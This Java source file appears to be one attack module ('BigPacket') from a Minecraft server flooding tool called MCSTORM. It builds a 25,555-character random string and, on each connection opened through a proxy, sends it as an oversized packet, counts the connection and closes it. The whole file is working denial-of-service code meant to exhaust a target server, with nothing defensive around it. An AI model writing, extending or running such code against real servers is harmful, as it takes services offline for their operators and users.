package io.MCSTORM.methods;

import io.MCSTORM.utils.NettyBootstrap;
import io.MCSTORM.utils.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

import java.io.IOException;
import java.security.SecureRandom;

public class BigPacket implements Method {
    final int a = 25555;
    SecureRandom r = new SecureRandom();
    String lol = "";

    public BigPacket() {
        for (int i = 1; i < this.a + 1; i++) {
            this.lol = this.lol + (char) (this.r.nextInt(125) + 1);
        }
    }

    public void accept(Channel channel, ProxyLoader.Proxy proxy) {
        ByteBuf b = Unpooled.buffer();
        ByteBufOutputStream out = new ByteBufOutputStream(b);
        try {
            out.writeUTF(this.lol);
            out.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        channel.writeAndFlush(b);
        NettyBootstrap.integer++;
        NettyBootstrap.totalConnections++;
        channel.close();
    }
}